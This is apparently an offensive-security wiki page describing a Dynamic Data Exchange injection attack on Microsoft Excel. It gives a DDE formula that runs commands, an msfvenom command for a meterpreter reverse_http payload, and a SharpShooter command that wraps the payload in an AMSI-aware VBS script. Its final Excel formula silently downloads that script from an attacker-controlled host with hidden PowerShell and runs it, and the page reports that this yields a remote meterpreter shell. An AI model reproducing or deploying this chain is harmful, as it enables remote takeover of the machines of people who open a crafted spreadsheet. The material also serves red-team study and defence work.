# ⭕ DDE Auto - Word/Excel

## Intro

This attack has been tested on the latest Windows10 LTSC edition with Microsoft Office 365 with up-to-date Windows Defender.

#### Requirements:

* Enabled Dynamic Data Exchange Server Lookup
* Enabled Dynamic Data Exchange Server Launch

Warning presented to the user who opens the worksheet:

![](<../../.gitbook/assets/image (2).png>)

sample CMD command for injection into Excel function:

```
=cmd|'/c cmd.exe /c calc.exe'!'A1'
```

## Exploitation

generate msfvenom shellcode:

```
msfvenom -a x86 -p windows/meterpreter/reverse_http LHOST=192.168.1.108 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f raw -o raw3.txt
```

Create a malicious VBS script with SharpShooter with included raw3.txt shellcode file we generated earlier:

{% embed url="https://github.com/mdsecactivebreach/SharpShooter" %}

```
python2 SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo2 --rawscfile raw3.txt --amsi amsienable
```

And inject the command to Microsoft Excel function:

```
=cmd|'/c cmd.exe /c powershell.exe -nop -w hidden iwr -outf %tmp%\\msf.vbs http://192.168.1.108:8000/foo2.vbs & %tmp%\\msf.vbs'!'A1'
```

After the user skips the warning we get a meterpreter shell:

![](<../../.gitbook/assets/image (8).png>)

